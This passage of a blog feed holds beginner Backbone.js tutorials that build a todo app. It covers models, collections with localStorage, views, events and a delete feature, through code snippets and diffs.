<figure class="highlight diff"><figcaption><span>Add event listeners for the Remove Button in app.TodoView</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/1267e531ae3ef508eb32e5308c2cc965f02d1b45/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -105,12 +106,14 @@</span></span><br><span class="line">       &#125;,</span><br><span class="line">       initialize: function()&#123;</span><br><span class="line">         this.model.on('change', this.render, this);</span><br><span class="line"><span class="addition">+        this.model.on('destroy', this.remove, this); // remove: Convenience Backbone'</span></span><br><span class="line">       &#125;,</span><br><span class="line">       events: &#123;</span><br><span class="line">         'dblclick label' : 'edit',</span><br><span class="line">         'keypress .edit' : 'updateOnEnter',</span><br><span class="line">         'blur .edit' : 'close',</span><br><span class="line"><span class="deletion">-        'click .toggle': 'toggleCompleted'</span></span><br><span class="line"><span class="addition">+        'click .toggle': 'toggleCompleted',</span></span><br><span class="line"><span class="addition">+        'click .destroy': 'destroy'</span></span><br><span class="line">       &#125;,</span><br><span class="line">       edit: function()&#123;</span><br><span class="line">         this.$el.addClass('editing');</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>3.- Add the destroy method to the TodoView.</p>
<figure class="highlight diff"><figcaption><span>Add the destroy method to app.TodoView</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/1267e531ae3ef508eb32e5308c2cc965f02d1b45/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -130,7 +133,10 @@</span></span><br><span class="line">       &#125;,</span><br><span class="line">       toggleCompleted: function()&#123;</span><br><span class="line">         this.model.toggle();</span><br><span class="line"><span class="deletion">-      &#125;</span></span><br><span class="line"><span class="addition">+      &#125;,</span></span><br><span class="line"><span class="addition">+      destroy: function()&#123;</span></span><br><span class="line"><span class="addition">+        this.model.destroy();</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line">     &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>You can download the full working code so far in <a href="https://raw.github.com/amejiarosario/Backbone-tutorial/1267e531ae3ef508eb32e5308c2cc965f02d1b45/backbone-tutorial.html" target="_blank" rel="noopener">here</a> and you can visualize the changes needed to implement the delete feature in <a href="https://github.com/amejiarosario/Backbone-tutorial/commit/1267e531ae3ef508eb32e5308c2cc965f02d1b45" target="_blank" rel="noopener">here</a></p>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Continue with the <a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/">4th part</a> and learn about Backbone‚Äôs Routes!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In tutorial we are going to continue learning about BackboneJS: CRUD.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="backbonejs" scheme="https://adrianmejia.com/tags/backbonejs/"/>
    
      <category term="tutorial_backbonejs" scheme="https://adrianmejia.com/tags/tutorial-backbonejs/"/>
    
  </entry>
  
  <entry>
    <title>Backbone.js for absolute beginners - getting started (part 2: Models, Collections and Views)</title>
    <link href="https://adrianmejia.com/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/"/>
    <id>https://adrianmejia.com/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/</id>
    <published>2012-09-13T04:08:00.000Z</published>
    <updated>2012-09-13T04:08:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>This tutorial builts on top of the <a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/">first part</a> and continue with BacboneJS‚Äôs Models, Collections and Views.</p>
<a id="more"></a>
<p>BackboneJS Tutorial series:</p>
<ol>
<li><a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/">Backbone.js for Absolute Beginners - Getting started (Part 1: Intro)</a></li>
<li>Backbone.js for absolute beginners - getting started (part 2: Models, Collections and Views) <strong>üëà you are here</strong></li>
<li><a href="/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/">Backbone.js for absolute beginners - getting started (part 3: CRUD)</a></li>
<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/">Backbone.js for absolute beginners - getting started (part 4: Routers)</a></li>
</ol>
<h1 id="Todo-App-in-Backbone">Todo App in Backbone<a href="#Todo-App-in-Backbone" class="headerlink" title="Todo App in Backbone"></a></h1><p>After completing this example app, you will have experience and basic understanding of all the modules of Backbone!</p>
<p>(Updated: 2013-02-02, 2013-11-24)
Notice: This tutorial was written using Backbone v.0.9.x, now version 1.1.x or later are out. However, all the principles explained here applies for both.</p>
<p><strong>Todo app Boiler plate</strong></p>
<p>Let‚Äôs start again with the initial <a href="https://raw.github.com/amejiarosario/Backbone-tutorial/439ff34409dfc01adca7f9f96efcd726295f1aac/backbone-tutorial.html" target="_blank" rel="noopener">HTML file</a> used on 1.1. Now, instead of div#container let‚Äôs add the following HTML code:</p>
<figure class="highlight html"><figcaption><span>HTML Structure</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"todoapp"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span> <span class="attr">id</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Todos<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"new-todo"</span> <span class="attr">placeholder</span>=<span class="string">"What needs to be done?"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"todo-list"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>We are going to implement a To-do list, which is basically un-ordered list (ul) of elements with checkboxes.</p>
<h1 id="Backbone-Model">Backbone.Model<a href="#Backbone-Model" class="headerlink" title="Backbone.Model"></a></h1><p>Models are the heart of every application. It contains the interactive data and the logic surrounding it, such as data validation, getters and setters, default values, data initialization, conversions and so on.
For our example, we are going to create a model called <code>Todo</code>, which will store a string of text (title) and whether the task has been completed or not.</p>
<figure class="highlight js"><figcaption><span>Todo Model</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = &#123;&#125;; <span class="comment">// create namespace for our app</span></span><br><span class="line"></span><br><span class="line">app.Todo = Backbone.Model.extend(&#123;</span><br><span class="line">  defaults: &#123;</span><br><span class="line">    title: <span class="string">''</span>,</span><br><span class="line">    completed: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Notice, that for convention classes names are capitalize, while instance variables and objects are not. Another important aspect of models it‚Äôs that their properties are dynamic; they can be created on the fly and doesn‚Äôt have any specific type associated.</p>
<p><strong>Test what you just coded!</strong></p>
<p>After you completed the code snippet above you can open your browser console (chrome‚Äôs console: ctrl+shift+i -or- ‚åò+alt+i) and try this out, to get familiar with the models:</p>
<figure class="highlight js"><figcaption><span>Practice in your Browser\'s console</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> todo = <span class="keyword">new</span> app.Todo(&#123;<span class="attr">title</span>: <span class="string">'Learn Backbone.js'</span>, <span class="attr">completed</span>: <span class="literal">false</span>&#125;); <span class="comment">// create object with the attributes specified.</span></span><br><span class="line">todo.get(<span class="string">'title'</span>); <span class="comment">// "Learn Backbone.js"</span></span><br><span class="line">todo.get(<span class="string">'completed'</span>); <span class="comment">// false</span></span><br><span class="line">todo.get(<span class="string">'created_at'</span>); <span class="comment">// undefined</span></span><br><span class="line">todo.set(<span class="string">'created_at'</span>, <span class="built_in">Date</span>());</span><br><span class="line">todo.get(<span class="string">'created_at'</span>); <span class="comment">// "Wed Sep 12 2012 12:51:17 GMT-0400 (EDT)"</span></span><br></pre></td></tr></table></figure>
<h1 id="Backbone-Collection">Backbone.Collection<a href="#Backbone-Collection" class="headerlink" title="Backbone.Collection"></a></h1><p>As its name indicates, collections are ordered sets of models, where you can get and set models in the collection, listen for events when any element in the collection changes, and fetching for model‚Äôs data from the server.</p>
<p>E.g.: <code>todoList.fetch();</code></p>
<p>Collections allows to save data (in database, file, memory), and it requires a reference to it. Therefore, you need to specify the <code>url</code> parameter with a relative url, where the model‚Äôs resource would be located on the server. Otherwise, you will get errors like:</p>
<p><code>A &quot;url&quot; property or function must be specified</code></p>
<p>We are not going to use a backend server for simplicity (I will do a new post for that); instead we are going to use HTML5‚Äôs local storage for persistence through a Backbone‚Äôs plugin. So, we need to define the localStorage property instead of URL. You need to include the backbone-localstorage.js with the rest of your libs as <a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">shown in the full code</a>:</p>
<p><code>&lt;script src=&quot;http://cdnjs.cloudflare.com/ajax/libs/backbone-localstorage.js/1.0/backbone.localStorage-min.js&quot; type=&quot;text/javascript&quot;&gt;</code></p>
<figure class="highlight js"><figcaption><span>Todo list Collection</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app.TodoList = Backbone.Collection.extend(&#123;</span><br><span class="line">  model: app.Todo,</span><br><span class="line">  localStorage: <span class="keyword">new</span> Store(<span class="string">"backbone-todo"</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// instance of the Collection</span></span><br><span class="line">app.todoList = <span class="keyword">new</span> app.TodoList();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>Test what you just your coded!</strong></p>
<p>(Google‚Äôs Chrome console shortcuts: ctrl+shift+i -or- ‚åò+alt+i)</p>
<figure class="highlight js"><figcaption><span>Practice in your Browser\'s console</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> todoList = <span class="keyword">new</span> app.TodoList()</span><br><span class="line">todoList.create(&#123;<span class="attr">title</span>: <span class="string">'Learn Backbone\'s Collection'</span>&#125;); <span class="comment">// notice: that `completed` will be set to false by default.</span></span><br><span class="line"><span class="keyword">var</span> lmodel = <span class="keyword">new</span> app.Todo(&#123;<span class="attr">title</span>: <span class="string">'Learn Models'</span>, <span class="attr">completed</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">todoList.add(lmodel);</span><br><span class="line">todoList.pluck(<span class="string">'title'</span>);     <span class="comment">// ["Learn Backbone's Collection", "Learn Models"]</span></span><br><span class="line">todoList.pluck(<span class="string">'completed'</span>); <span class="comment">// [false, true]</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(todoList);    <span class="comment">// "[&#123;"title":"Learn Backbone's Collection","completed":false,"id":"d9763e99-2267-75f5-62c3-9d7e40742aa6"&#125;,&#123;"title":"Learn Models","completed":true&#125;]"</span></span><br></pre></td></tr></table></figure>
<h1 id="Backbone-View">Backbone.View<a href="#Backbone-View" class="headerlink" title="Backbone.View"></a></h1><p>As mentioned in <a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/#1.2">1.2</a>, Views doesn‚Äôt have the HTML markups for our application, but instead (It‚Äôs like the controller in MVC frameworks) process data and link it to templates and it finally render HTML based on events or data changes.</p>
<h2 id="Basic-Properties">Basic Properties<a href="#Basic-Properties" class="headerlink" title="Basic Properties"></a></h2><p>There are 4 basic properties in a view: el, initialize, render, and events.</p>
<p>We have already seen the first 3 and will see later the fourth one. Do you remember the Hello World View from <a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/#1.2">1.2</a>?</p>
<figure class="highlight js"><figcaption><span>Example of a Backbone.View</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> AppView = Backbone.View.extend(&#123;</span><br><span class="line">  <span class="comment">// el - stands for element. Every view has a element associate in with HTML</span></span><br><span class="line">  <span class="comment">//      content will be rendered.</span></span><br><span class="line">  el: <span class="string">'#container'</span>,</span><br><span class="line">  <span class="comment">// It's the first function called when this view it's instantiated.</span></span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.render();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// $el - it's a cached jQuery object (el), in which you can use jQuery functions</span></span><br><span class="line">  <span class="comment">//       to push content. Like the Hello World in this case.</span></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el.html(<span class="string">"Hello World"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="view-el"><code>view.el</code><a href="#view-el" class="headerlink" title="view.el"></a></h2><p>Every view needs to reference a DOM at all times. Therefore, the view will inject content into this element. This is the <code>el</code> property. <code>this.el</code> is created from view‚Äôs <code>el</code>,<code>tagName</code>, <code>className</code>, <code>id</code> or <code>attributes</code> properties. If none of these are specified, then this.el is an empty <code>div</code>. The <code>view.$el</code> it‚Äôs a cached jQuery object of the view‚Äôs element (view.el).</p>
<h2 id="Initialize-constructor">Initialize/constructor<a href="#Initialize-constructor" class="headerlink" title="Initialize/constructor"></a></h2><p>Here you have the option to pass parameters that will be attached to a model, collection or view.el.</p>
<h2 id="render"><code>render</code><a href="#render" class="headerlink" title="render"></a></h2><p>This function injects the markup into the elements. Not all views require having a render function, as you are going to see in the sample code, they can call other view‚Äôs render functions.</p>
<h2 id="delegated-events">delegated events<a href="#delegated-events" class="headerlink" title="delegated events"></a></h2><p>Events are written in the following format:</p>
<p><code>{&quot;&lt;EVENT_TYPE&gt; &lt;ELEMENT_ID&gt;&quot;: &quot;&lt;CALLBACK_FUNTION&gt;&quot;}</code></p>
<p>E.g.</p>
<p><code>events: {&#39;keypress #new-todo&#39;: &#39;createTodoOnEnter&#39;}</code></p>
<p>in jQuery it would be something like:</p>
<p><code>$(&#39;#new-todo&#39;).keypress(createTodoOnEnter);</code></p>
<h1 id="Todo-View">Todo View<a href="#Todo-View" class="headerlink" title="Todo View"></a></h1><p>Now back to our To-do application: We need a view that renders each of the todo model objects into the page. The <code>item-template</code> and <code>app.TodoView</code> will render each todo item.</p>
<figure class="highlight html"><figcaption><span>item-template</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/template"</span> <span class="attr">id</span>=<span class="string">"item-template"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line"><span class="javascript">    &lt;input <span class="class"><span class="keyword">class</span></span>=<span class="string">"toggle"</span> type=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">%-</span> <span class="attr">title</span> %&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In the following block of code we have the Backbone.View which uses the above template (<code>#item-template</code>) to fill it out the title from the <code>model</code> we pass along.</p>
<figure class="highlight js"><figcaption><span>Todo View</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// renders individual todo items list (li)</span></span><br><span class="line">app.TodoView = Backbone.View.extend(&#123;</span><br><span class="line">  tagName: <span class="string">'li'</span>,</span><br><span class="line">  template: _.template($(<span class="string">'#item-template'</span>).html()),</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el.html(<span class="keyword">this</span>.template(<span class="keyword">this</span>.model.toJSON()));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// enable chained calls</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>When we instanciate a Backbone View, it can receive any parameter that we need. In this case, since we call the parameter <code>model</code> let‚Äôs instanciate it with a Backbone Model (e.g. todo):</p>
<p><code>var view = new app.TodoView({model: todo});</code></p>
<p>Also notice that our view is using a <code>tagName: li</code> instead of the just <code>el</code> from before. This means that the new render elements will be wrapped around a <code>&lt;li&gt;&lt;/li&gt;</code></p>
<h1 id="Backbone-Events">Backbone.Events<a href="#Backbone-Events" class="headerlink" title="Backbone.Events"></a></h1><p>This module can be mixed with any object and give it the pub/sub (observer patter) behaviour. Events provides a couple of methods from which we are going to discuss: <code>on</code>, <code>off</code> and <code>trigger</code>. (If this you are familiar with then in jQuery, they will work the same way + some nice built-in features)</p>
<p><strong>Subscribing to Events with on</strong>
<code>object.on(event, callback, [context])</code></p>
<p>Also called bind. It binds an object to an event and a callback. When that event it‚Äôs triggered it executes the callback.</p>
<p>E.g.
<code>todoList.on(&#39;add&#39;, this.addAll, this);</code></p>
<p>Everytime a new item is <code>add</code>ed to a Backbone.Collection the built-in event <code>add</code> (<a href="http://backbonejs.org/#Collection-add" target="_blank" rel="noopener">docs for add</a> is triggered. In the example above, after the custom event is triggered, the todoList‚Äôs callback <code>addAll()</code> is executed and the current object is passed with <code>this</code> as a <code>context</code>.</p>
<p>Events can also be set on arbitrary objects using underscore.js <code>extend</code> function:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123;&#125;,</span><br><span class="line">    callback = <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">"Triggered "</span> + msg); &#125;;</span><br><span class="line"></span><br><span class="line">_.extend(object, Backbone.Events);</span><br><span class="line"></span><br><span class="line">object.on(<span class="string">"my_event"</span>, callback);</span><br><span class="line"></span><br><span class="line">object.trigger(<span class="string">"my_event"</span>, <span class="string">"my custom event"</span>);</span><br></pre></td></tr></table></figure>
<h1 id="App-View">App View<a href="#App-View" class="headerlink" title="App View"></a></h1><p>Now, we need another view that take a collection and render each of the individual items. We are going to call it ‚ÄòAppView‚Äô. This is a new large chunk of code so read it closely. Take a look through this code and try to identify each of the elements (we have already describe them in the previous sections).</p>
<figure class="highlight js"><figcaption><span>Todo View</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/fe0efb0fd0c4c3c4cb5fd61e9917165082f9a562/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// renders the full list of todo items calling TodoView for each one.</span></span><br><span class="line">app.AppView = Backbone.View.extend(&#123;</span><br><span class="line">  el: <span class="string">'#todoapp'</span>,</span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.input = <span class="keyword">this</span>.$(<span class="string">'#new-todo'</span>);</span><br><span class="line">    <span class="comment">// when new elements are added to the collection render then with addOne</span></span><br><span class="line">    app.todoList.on(<span class="string">'add'</span>, <span class="keyword">this</span>.addOne, <span class="keyword">this</span>);</span><br><span class="line">    app.todoList.on(<span class="string">'reset'</span>, <span class="keyword">this</span>.addAll, <span class="keyword">this</span>);</span><br><span class="line">    app.todoList.fetch(); <span class="comment">// Loads list from local storage</span></span><br><span class="line">  &#125;,</span><br><span class="line">  events: &#123;</span><br><span class="line">    <span class="string">'keypress #new-todo'</span>: <span class="string">'createTodoOnEnter'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  createTodoOnEnter: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( e.which !== <span class="number">13</span> || !<span class="keyword">this</span>.input.val().trim() ) &#123; <span class="comment">// ENTER_KEY = 13</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    app.todoList.create(<span class="keyword">this</span>.newAttributes());</span><br><span class="line">    <span class="keyword">this</span>.input.val(<span class="string">''</span>); <span class="comment">// clean input box</span></span><br><span class="line">  &#125;,</span><br><span class="line">  addOne: <span class="function"><span class="keyword">function</span>(<span class="params">todo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> view = <span class="keyword">new</span> app.TodoView(&#123;<span class="attr">model</span>: todo&#125;);</span><br><span class="line">    $(<span class="string">'#todo-list'</span>).append(view.render().el);</span><br><span class="line">  &#125;,</span><br><span class="line">  addAll: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$(<span class="string">'#todo-list'</span>).html(<span class="string">''</span>); <span class="comment">// clean the todo list</span></span><br><span class="line">    app.todoList.each(<span class="keyword">this</span>.addOne, <span class="keyword">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  newAttributes: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="keyword">this</span>.input.val().trim(),</span><br><span class="line">      completed: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------</span></span><br><span class="line"><span class="comment">// Initializers</span></span><br><span class="line"><span class="comment">//--------------</span></span><br><span class="line"></span><br><span class="line">app.appView = <span class="keyword">new</span> app.AppView();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p> Continue with the <a href="/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/">3rd part</a> and learn how to make CRUD for your models!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This tutorial builts on top of the &lt;a href=&quot;/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/&quot;&gt;first part&lt;/a&gt; and continue with BacboneJS‚Äôs Models, Collections and Views.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="backbonejs" scheme="https://adrianmejia.com/tags/backbonejs/"/>
    
      <category term="tutorial_backbonejs" scheme="https://adrianmejia.com/tags/tutorial-backbonejs/"/>
    
      <category term="todo app" scheme="https://adrianmejia.com/tags/todo-app/"/>
    
  </entry>
  
  <entry>
    <title>Backbone.js for Absolute Beginners - Getting started (Part 1: Intro)</title>
    <link href="https://adrianmejia.com/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/"/>
    <id>https://adrianmejia.com/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/</id>
    <published>2012-09-12T02:50:00.000Z</published>
    <updated>2012-09-12T02:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Backbone.js is a JavaScript library, among many others, that is gaining special attention in the web development community because it‚Äôs ease of use and the structure that it provides to JavaScript applications.</p>
<p>Notice that BackboneJS is not a framework but a library. The difference is who is in control. Using a library YOU are in control, but using a framework there is an inversion of control: the framework calls you. Libraries give you a lot of flexibility, while frameworks has opinionated ways of doing things but can save you writing boiler plate code. Follow my <a href="/blog/categories/angularjs/">AngularJS</a> tutorial series for a framework solution.</p>
<p>Let‚Äôs dive into BackboneJS! and see how this flexible library can bring order to your Javascript!</p>
<a id="more"></a>
<p>BackboneJS Tutorial series:</p>
<ol>
<li>Backbone.js for Absolute Beginners - Getting started (Part 1: Intro) <strong>üëà you are here</strong></li>
<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/">Backbone.js for absolute beginners - getting started (part 2: Models, Collections and Views)</a></li>
<li><a href="/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/">Backbone.js for absolute beginners - getting started (part 3: CRUD)</a></li>
